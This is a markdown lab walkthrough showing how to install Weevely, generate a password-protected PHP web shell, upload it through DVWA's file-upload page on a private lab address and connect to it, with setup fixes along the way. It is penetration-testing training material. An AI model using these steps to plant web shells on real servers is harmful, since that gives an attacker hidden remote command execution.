# Web Shells with Weevely

What is Weevely?

Weevely is a web shell designed for post-exploitation and penetration testing. It simulates a Telnet-like connection and provides many built-in modules for:
 - File management
 - System enumeration
 - Network scanning
 - Privilege escalation
 - Backdoor maintenance

---


## Installation & Setup

### Installation on kali linux
````
sudo apt update
sudo apt install weevely
````
<img width="667" height="335" alt="image" src="https://github.com/user-attachments/assets/7539cc5a-d554-42c9-8baf-78a18b2e7d90" />


### Verify Installation
````
weevely --help
````
<img width="585" height="235" alt="image" src="https://github.com/user-attachments/assets/ccb24e58-2122-49af-9a10-da61266ff4c1" />




#### Options Use
| Subcommand   |                                                                              Purpose | Syntax                                        | Example                                                                                                                                    |
| ------------ | -----------------------------------------------------------------------------------: | --------------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------ |
| `terminal`   | Run an interactive terminal session or execute a single command on the target agent. | `weevely terminal <URL> <password> [cmd]`     | `weevely terminal http://192.168.100.97/dvwa/uploads/shell.php 'MyPass123!'`<br>`weevely terminal http://10.0.0.5/shell.php 'p@ss' whoami` |
| `session`    |    Recover / resume an existing saved session file, or run a single command from it. | `weevely session <path> [cmd]`                | `weevely session ~/.weevely/session_192.168.100.97`<br>`weevely session ~/.weevely/session_192.168.100.97 whoami`                          |
| `generate`   | Create a new PHP agent (webshell) protected by the given password and saved to path. | `weevely generate <password> <path>`          | `weevely generate 'MyPass123!' shell.php`                                                                                                  |
| `-h, --help` |                                                                  Show help and exit. | `weevely --help` or `weevely terminal --help` | `weevely --help`                                                                                                                           |


---



## GENERATE WEEVELY WEB SHELL

### Create Basic Web Shell
````
weevely generate k4n0ng shell.php
````
<img width="858" height="110" alt="image" src="https://github.com/user-attachments/assets/4e7aff8d-90eb-4bd6-9c40-4e78b08348f1" />

- `generate`: Creates a new obfuscated PHP shell.
- `k4n0ng`: Sets the access password for the shell.

### Verify the Shell File

#### Check the generated file
````
ls -la shell.php
file shell.php
````
<img width="730" height="202" alt="image" src="https://github.com/user-attachments/assets/dc6dbdf6-c75b-463d-a90a-bbc7ccaab236" />


#### View the shell content
````
head -n 20 shell.php
````
<img width="1919" height="270" alt="image" src="https://github.com/user-attachments/assets/d927e6dc-9096-4f31-b6af-c234d4c6e92f" />

---


## Upload Shell 
- Go to our target: http://192.168.100.97:8080/vulnerabilities/upload/
<img width="799" height="642" alt="image" src="https://github.com/user-attachments/assets/e89abc53-a64a-4b83-ab4e-aa7bcf4aa713" />

- Upload our `shell` to our target:
<img width="802" height="645" alt="image" src="https://github.com/user-attachments/assets/2b696f00-1a1b-4f10-bfb7-5ec06b6d07a1" />

<img width="977" height="747" alt="image" src="https://github.com/user-attachments/assets/4a7ff118-8c7b-4dd5-9058-949e92a001e8" />

<img width="795" height="645" alt="image" src="https://github.com/user-attachments/assets/bb4ae833-350b-4556-a109-eb32cb776a1b" />

<img width="803" height="643" alt="image" src="https://github.com/user-attachments/assets/1ff77834-04e0-44b9-87dd-f8b7de98d332" />



- Connect
````
weevely http://192.168.100.97:8080/dvwa/hackable/uploads/shell.php k4n0ng
````
<img width="694" height="320" alt="image" src="https://github.com/user-attachments/assets/127451c1-f29a-4df8-9fb1-be26ff99de0d" />

- But in my machine it error.




### How to fix it:

````
python3 -m venv ~/weevely~venv
source ~/weevely~venv/bin/activate
cd ~
````
<img width="368" height="166" alt="image" src="https://github.com/user-attachments/assets/27ad5a18-00ed-46fe-813d-ca0891069ce5" />



````
git clone https://github.com/epinna/weevely3.git weevely3-fresh
````
<img width="723" height="179" alt="image" src="https://github.com/user-attachments/assets/f4021402-11c5-49e9-8d22-ab75d91dcd3e" />

````
cd weevely3-fresh
pip install -e .
````
<img width="1033" height="621" alt="image" src="https://github.com/user-attachments/assets/a4be0e09-9e6f-426c-84e0-55e997b26316" />


````
which weevely
weevely -help
````
<img width="549" height="346" alt="image" src="https://github.com/user-attachments/assets/31a6aacf-b138-48ee-b896-8aa94e6706b4" />

````
cd ~/weevely3-fresh || cd ~/weevely3 || pwd
pip install --upgrade pip setuptools wheel
pip install -e .
````
<img width="1014" height="727" alt="image" src="https://github.com/user-attachments/assets/1db5a2dd-eb0e-43e0-acbe-ae298742b5d6" />

````
hash -r
which weevely
type -a weevely
python -c "import shutil,sys; print('venv_prefix=', sys.prefix); print('exe=', shutil.which('weevely'))"
weevely --help
````
<img width="944" height="563" alt="image" src="https://github.com/user-attachments/assets/e7e16e62-28c4-496b-8590-0cc5c1c66689" />

- In this i try to sovle this error along time it so hard to my machine. Also now we can create shell and connect it.

---

- In this we create shell again:
````
weevely generate k4n0ng shell.php
````
<img width="517" height="71" alt="image" src="https://github.com/user-attachments/assets/1c86ab90-e2d0-4d20-86b0-db6800e53a2e" />

````
ls -la shell.php
file shell.php
````
<img width="480" height="143" alt="image" src="https://github.com/user-attachments/assets/57abddfa-0928-4248-8157-51299a45b129" />


- Upload file to our target: http://192.168.100.97:8080/vulnerabilities/upload/
<img width="800" height="650" alt="image" src="https://github.com/user-attachments/assets/7fc228f1-62dd-4911-83e5-a3486250efef" />

<img width="978" height="497" alt="image" src="https://github.com/user-attachments/assets/ace241f0-639a-4e20-bc02-f387df8bb358" />

<img width="802" height="646" alt="image" src="https://github.com/user-attachments/assets/adc10eed-f6f3-44a7-a25e-1b69a0b9d1be" />

<img width="805" height="646" alt="image" src="https://github.com/user-attachments/assets/377d7080-1581-4224-bc10-624cdd15bceb" />


---



## CONNECT TO WEEVELY SHELL

### Basic Connection
````
weevely http://192.168.100.97:8080/dvwa/hackable/uploads/shell.php k4n0ng
````
<img width="784" height="261" alt="image" src="https://github.com/user-attachments/assets/fefc567d-8c99-4d11-9165-16adcdfc786b" />

- Now we got successful to get shell.


----


## End of Weevly Section


---


---


## Credit: Nin Kanong (k4n0ng)


---
